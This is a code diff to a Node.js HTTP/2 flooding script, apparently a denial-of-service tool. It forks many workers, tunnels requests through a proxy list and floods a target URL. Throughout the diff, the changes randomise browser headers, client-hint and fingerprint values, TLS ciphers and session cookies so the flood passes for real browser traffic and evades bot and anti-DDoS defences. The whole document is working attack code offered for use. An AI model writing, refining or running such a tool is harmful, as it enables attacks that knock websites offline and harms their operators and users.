@@ -30,17 +30,71 @@ const settings = {
   Rate: "500",
   threads: "100",
   proxyFile: "proxies.txt"
-}
+};
 
-const cplist = [
-  "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
-  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
-  "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
+const cipherList = [
+  "TLS_AES_256_GCM_SHA384",
+  "TLS_CHACHA20_POLY1305_SHA256",
+  "TLS_AES_128_GCM_SHA256",
+  "ECDHE-RSA-AES256-GCM-SHA384",
+  "ECDHE-RSA-AES128-GCM-SHA256",
+  "ECDHE-RSA-CHACHA20-POLY1305",
+  "ECDHE-RSA-AES256-SHA384",
+  "ECDHE-RSA-AES128-SHA256",
+  "ECDHE-ECDSA-AES256-GCM-SHA384",
+  "ECDHE-ECDSA-AES128-GCM-SHA256",
+  "ECDHE-ECDSA-CHACHA20-POLY1305",
+  "ECDHE-ECDSA-AES256-SHA384",
+  "ECDHE-ECDSA-AES128-SHA256",
+  "DHE-RSA-AES256-GCM-SHA384",
+  "DHE-RSA-AES128-GCM-SHA256",
+  "DHE-RSA-CHACHA20-POLY1305",
+  "TLS_AES_128_CCM_SHA256",
+  "TLS_AES_128_CCM_8_SHA256"
 ];
 
-var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
-var proxies = readLines(settings.proxyFile);
+const acceptHeaders = [
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
+];
 
+const acceptLanguages = [
+  "en-US,en;q=0.9",
+  "en-GB,en;q=0.8",
+  "en-US,en;q=0.9,fr;q=0.8",
+  "en-US,en;q=0.9,es;q=0.8",
+  "en-US,en;q=0.9,de;q=0.8"
+];
+
+const acceptEncodings = [
+  "gzip, deflate, br",
+  "gzip, deflate",
+  "br, gzip, deflate",
+  "gzip, br"
+];
+
+const cacheControls = [
+  "no-cache",
+  "max-age=0",
+  "no-store",
+  "must-revalidate"
+];
+
+const screenResolutions = [
+  "1920x1080",
+  "1366x768",
+  "1440x900",
+  "1536x864",
+  "2560x1440"
+];
+
+const colorDepths = ["24", "32"];
+const deviceMemoryOptions = ["4", "8", "16"];
+const hardwareConcurrencyOptions = ["4", "8", "12", "16"];
+
+const proxies = readLines(settings.proxyFile);
 const parsedTarget = url.parse(settings.target);
 
 if (cluster.isMaster) {
@@ -48,7 +102,7 @@ if (cluster.isMaster) {
     cluster.fork();
   }
 } else {
-  setInterval(runFlooder)
+  setInterval(runFlooder);
 }
 
 class NetSocket {
@@ -58,15 +112,15 @@ class NetSocket {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
-    const buffer = new Buffer.from(payload);
+    const buffer = Buffer.from(payload);
 
     const connection = net.connect({
       host: options.host,
       port: options.port
     });
 
-    connection.setTimeout(options.timeout * 10000);
-    connection.setKeepAlive(true, 100000);
+    connection.setTimeout(options.timeout * 1000);
+    connection.setKeepAlive(true, 60000);
 
     connection.on("connect", () => {
       connection.write(buffer);
@@ -89,7 +143,7 @@ class NetSocket {
       return callback(undefined, "error: timeout exceeded");
     });
 
-    connection.on("error", error => {
+    connection.on("error" , error => {
       connection.destroy();
       return callback(undefined, "error: " + error);
     });
@@ -98,23 +152,38 @@ class NetSocket {
 
 const Socker = new NetSocket();
 
-headers[":method"] = "GET";
-headers[":path"] = parsedTarget.path;
-headers[":scheme"] = "https";
-headers["accept"] = "/";
-headers["accept-language"] = "en-US,en;q=0.9";
-headers["accept-encoding"] = "gzip, deflate";
-headers["cache-control"] = "no-cache";
-headers["upgrade-insecure-requests"] = "1";
-
 function runFlooder() {
   const proxyAddr = randomElement(proxies);
   const parsedProxy = proxyAddr.split(":");
   const userAgentv2 = new UserAgent();
-  var useragent = userAgentv2.toString();
+  const useragent = userAgentv2.toString();
 
+  headers[":method"] = "GET";
+  headers[":path"] = parsedTarget.path;
+  headers[":scheme"] = "https";
   headers[":authority"] = parsedTarget.host;
   headers["user-agent"] = useragent;
+  headers["accept"] = randomElement(acceptHeaders);
+  headers["accept-language"] = randomElement(acceptLanguages);
+  headers["accept-encoding"] = randomElement(acceptEncodings);
+  headers["cache-control"] = randomElement(cacheControls);
+  headers["upgrade-insecure-requests"] = "1";
+  headers["sec-fetch-dest"] = "document";
+  headers["sec-fetch-mode"] = "navigate";
+  headers["sec-fetch-site"] = "none";
+  headers["sec-fetch-user"] = "?1";
+  headers["sec-ch-ua"] = `"Chromium";v="${randomIntn(100, 120)}", "Google Chrome";v="${randomIntn(100, 120)}", "Not;A=Brand";v="99"`;
+  headers["sec-ch-ua-mobile"] = "?0";
+  headers["sec-ch-ua-platform"] = `"${randomElement(['Windows', 'macOS', 'Linux'])}"`;
+  headers["referer"] = `https://${parsedTarget.host}/`;
+  headers["origin"] = `https://${parsedTarget.host}`;
+  headers["dnt"] = "1";
+  headers["pragma"] = "no-cache";
+  headers["viewport-width"] = randomElement(screenResolutions).split("x")[0];
+  headers["device-memory"] = randomElement(deviceMemoryOptions);
+  headers["hardware-concurrency"] = randomElement(hardwareConcurrencyOptions);
+  headers["color-depth"] = randomElement(colorDepths);
+  headers["cookie"] = `session=${crypto.randomBytes(16).toString('hex')}; lang=${randomElement(['en', 'fr', 'es', 'de'])}`;
 
   const proxyOptions = {
     host: parsedProxy[0],
@@ -126,51 +195,56 @@ function runFlooder() {
   Socker.HTTP(proxyOptions, (connection, error) => {
     if (error) return;
 
-    connection.setKeepAlive(true, 100000);
+    connection.setKeepAlive(true, 60000);
 
     const tlsOptions = {
-      ALPNProtocols: ['h2', 'http/1.1', 'h3', 'http/2 quic/43', 'http/2 quic/44', 'http/2 quic/45'],
-      challengesToSolve: Infinity,
-      followAllRedirects: true,
-      clientTimeout: Infinity,
-      clientlareMaxTimeout: Infinity,
-      maxRedirects: Infinity,
-      ciphers: cipper,
-      servername: url.hostname,
+      ALPNProtocols: ['h2', 'http/1.1', 'h3'],
+      ciphers: cipherList[randomIntn(0, cipherList.length)],
+      servername: parsedTarget.host,
       socket: connection,
-      honorCipherOrder: true,
-      echdCurve: "GREASE:X25519:x25519",
-      secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
       secure: true,
       rejectUnauthorized: false,
-      port: 80,
-      uri: parsedTarget.host,
-      servername: parsedTarget.host,
+      maxCachedSessions: 50,
+      honorCipherOrder: true,
+      ecdhCurve: "GREASE:X25519:P-256:P-384:P-521",
+      secureProtocol: ["TLSv1_3_method", "TLSv1_2_method"],
+      secureOptions: 
+        crypto.constants.SSL_OP_NO_SSLv2 |
+        crypto.constants.SSL_OP_NO_SSLv3 |
+        crypto.constants.SSL_OP_NO_COMPRESSION |
+        crypto.constants.SSL_OP_NO_RENEGOTIATION |
+        crypto.constants.SSL_OP_TLSEXT_PADDING |
+        crypto.constants.SSL_OP_ALL,
+      keepAlive: true,
+      keepAliveMsecs: 1000,
+      maxSockets: 100,
+      highWaterMark: 16384,
+      minVersion: 'TLSv1.2',
+      maxVersion: 'TLSv1.3'
     };
 
     const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
-    tlsConn.setKeepAlive(true, 10 * 10000);
+    tlsConn.setKeepAlive(true, 60000);
 
     const client = http2.connect(parsedTarget.href, {
       protocol: "https:",
       settings: {
-        headerTableSize: 65536,
-        maxConcurrentStreams: 1000,
-        initialWindowSize: 6291456,
-        maxHeaderListSize: 262144,
+        headerTableSize: 4096,
+        maxConcurrentStreams: 100,
+        initialWindowSize: 65535,
+        maxHeaderListSize: 8192,
         enablePush: false
       },
-      maxSessionMemory: 3333,
-      maxDeflateDynamicTableSize: 4294967295,
+      maxSessionMemory: 1024,
       createConnection: () => tlsConn,
-      socket: connection,
+      socket: connection
     });
 
     client.settings({
-      headerTableSize: 65536,
-      maxConcurrentStreams: 1000,
-      initialWindowSize: 6291456,
-      maxHeaderListSize: 262144,
+      headerTableSize: 4096,
+      maxConcurrentStreams: 100,
+      initialWindowSize: 65535,
+      maxHeaderListSize: 8192,
       enablePush: false
     });
 
@@ -181,7 +255,6 @@ function runFlooder() {
             .on("response", response => {
               request.close();
               request.destroy();
-              return;
             });
 
           request.end();
@@ -192,13 +265,11 @@ function runFlooder() {
     client.on("close", () => {
       client.destroy();
       connection.destroy();
-      return;
     });
 
     client.on("error", error => {
       client.destroy();
       connection.destroy();
-      return;
     });
   });
 }
